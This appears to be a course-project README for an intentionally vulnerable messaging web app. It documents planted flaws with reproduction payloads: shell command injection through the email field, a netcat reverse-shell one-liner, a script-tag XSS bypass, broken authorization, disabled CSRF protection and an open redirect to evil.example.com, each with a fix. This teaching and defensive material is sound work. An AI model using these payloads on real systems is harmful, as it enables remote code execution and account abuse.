Messagebook - Cyber Security Base - Project I
=============================================

First project for [Cyber Security Base course](https://cybersecuritybase.github.io/).

This is a barebones messaging app. Testing credentials are `ted:ted` and `teddy:ted`
Any additional bugs found from the application are purely accidental.

Relevant urls:

- http://localhost:8080/signup new account creation
- http://localhost:8080/login login as an existing user

## Vulnerabilities by category

### A1: Command injection in mailing functionality

URL: http://localhost:8080/signup

When registering, the user is instructed to input their account details with an valid email address. This address will be validated against a one-time authorization code (OTAC) sent to the specified address. Email functionality in `MailService` is supposed to be implemented with sendmail, qmail or other mail transfer agent (MTA) executable, but due to the nature of the assignment any mail will not actually be sent.

The MTA executable is executed with the Java runtime `exec()` call within a shell environment, so providing an email address with functional shell script as a suffix will execute the script with the runtime privileges. Consider the behaviour to be similar with PHPMailer. The functionality is intended to be cross-platform, so Windows command interpreter injection should also be possible, but I have not tested this.

Example email field input sequence for shell: `hello@example.com; touch /tmp/pwned`

Check the /tmp/ directory for the created file to confirm the vulnerability.

**Explanation**: when the `exec()` call is made with the String array `{"/bin/sh", "-c", "echo " + account.getEmail()}` the method will execute `/bin/sh -c echo hello@example.com; touch /tmp/pwned`. The `-c` will set `/bin/sh` to read and evaluate the commands from the argument list, which now is `echo hello@example.com; touch /tmp/pwned`. We can imagine that the `echo` is the MTA executable so this will execute the MTA and the `touch` command in addition, which will create the file `/tmp/pwned`.

This way we can execute any command in the runtime context. We can execute the commands `rm /tmp/shell;mknod /tmp/shell p;nc localhost 10009 0</tmp/shell|/bin/sh 1>/tmp/shell` and in our local machine `nc -v -l 10009`. This will create a reverse shell that will take input as commands and output the command output. This can be used to download and install your own binaries and conduct additional attacks to other hosts in the network. The methods are similar on Windows platforms, but with batch scripting.

**FIX**: make use of Java's JavaMail API functionality or only accept email addresses with a specific pattern ie. `[a-z0-9\.\-\+]+@[a-z0-9]+\.[a-z]+`

### A2: Broken authentication: email validation code

URL: http://localhost:8080/validate/{user}

After registering, the user will be asked to input the received code. This code is not generated with a secure pseudorandom number generator, as it is derived from the username. The code can be easily duplicated with calculating the MD5 of the username and taking the first 5 characters of the hex digest. In addition to this, the page can be accessed by anyone and the code is never invalidated.

**FIX**: Make sure you generate random code for every user and invalidate any temporary tokens etc. that you mail in a potentially unencrypted medium.

### A3: Poor input/output sanitation for posted messages

URL: http://localhost:8080/messages/{username}

After registering, the user has the chance to send messages to other users in the system and to themselves. These messages are intended to have HTML structure, so the HTML encoding has been turned off in the Thymeleaf template `messages.html` with the `th:utext` to introduce the developers own homebrew input validation scheme in the service `SanitizerService`. It is based on a blacklist of strings that are removed from the message body, so it is easily defeated.

Example message body: `<sCript>alert('xss!');</sCript>`

**FIX**: A more quick fix would turn off the grand, homebrew sanitization scheme and use `th:text` in place. Downside is that the message can't have any markup language associated with it anymore. The developer could introduce some flavour of markdown formatting which would get rendered with Thymeleaf in to HTML.

With user generated, free-form messages such as these, they should be stored as-is without any modifications to the database. When they are displayed, they should be modified to fit the context of the consumer, in this case the browser. If the messages are transferred to some other medium, such as SMS messages, the body should be sanitized in the context of a text message (strip HTML tags, shorten urls or insert abbreviations etc.).

### A4: Indirect user reference

URLS:
- http://localhost:8080/account/{username}
- http://localhost:8080/message/{username}

The users can choose whether or not they are visible in the site's message and account listings from their settings. This does not work correctly as users can be still accessed with a direct url. The hiding functionality is done purely with the template engine rules.

Example: there exists an example user ted that can be accessed in http://localhost:8080/account/ted even though he is set as not visible.

**FIX**: In AccountController.userMessages and MessageController.userMessages check whether the user has set the visibility attribute to true and return a `403 Forbidden` or `404 Not Found` code to the browser. 

### A7: User settings can be changed by any other user

URL: http://localhost:8080/account/{username}

AccountController.userSettings does not check the authorization of the POST request, so any logged in user can POST new settings for the any user.

Easiest reproduction of the issue is changing the currently logged in user's form action attribute to any other user such as:

`<form action="/account/teddy" method="POST">`

becomes 

`<form action="/account/ted" method="POST">`

**FIX**: AccountController.userSettings should be changed to check for the currently logged in user against the user for the proposed change.

### A8: CSRF is disabled

Forms do not contain any Cross-Site-Request-Forgery tokens.

Attacker can POST to any controller as a currently logged in user, and can be chained with the previously mentioned vulnerability.

**FIX**: In the class SecurityConfiguration remove `csrf().disable()`

### A10: Unvalidated redirect

SignupController.validateAccount will redirect to any url provided in the POST form.

Attacker can make the user POST a valid code but modify the url parameter in the action, thus redirecting the user to a potentially fraudulent or malicious site.

`<form action="/validate/ted?url=/login" method="POST">`

becomes

`<form action="/validate/ted?url=http://evil.example.com" method="POST">`

**FIX**: Only redirect users inside the application or to predetermined trusted URLs


